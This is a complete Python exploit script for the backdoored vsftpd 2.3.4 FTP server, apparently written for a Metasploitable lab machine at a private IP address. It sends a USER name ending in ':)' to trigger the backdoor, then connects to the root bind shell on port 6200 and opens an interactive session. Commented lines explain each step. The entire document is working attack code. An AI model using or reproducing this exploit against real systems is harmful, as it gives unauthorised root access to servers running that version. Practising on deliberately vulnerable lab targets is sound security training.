import socket, time
from telnetlib import Telnet

s = socket.socket()
s.connect(("192.168.56.103", 21))	#connecting to Metasploitable on port 21 (FTP)

print("[*] Trying to exploit vsftpd...")
s.recv(128)				#receiving 128 bytes
s.send(b"USER fanfa:)\n")		#USER = "Fanfo:)" (it could be any string terminating with the smile)
s.recv(128)				#receiving 128 bytes
s.send(b"PASS pass\n")			#PASS = "pass" (it could be any string)
print("[*] Exploit sent. Waiting for shell...")

time.sleep(3)				#we have to wait some seconds before connecting to the newly opened port which gives a bind shell with root privileges (port 6200)

print("[*] Trying to connect to the backdoor...")
shell = socket.socket()
shell.connect(("192.168.56.103", 6200))	#connecting to Metasploitable on port 6200

#to get the interactive mode with the shell, we have to perform the following instructions
t = Telnet()
t.sock = shell
print("[+] Backdoor!")
t.interact()

#when the interaction with the shell is finished, both the shell and the connection with FTP have to be closed
shell.close()
s.close()
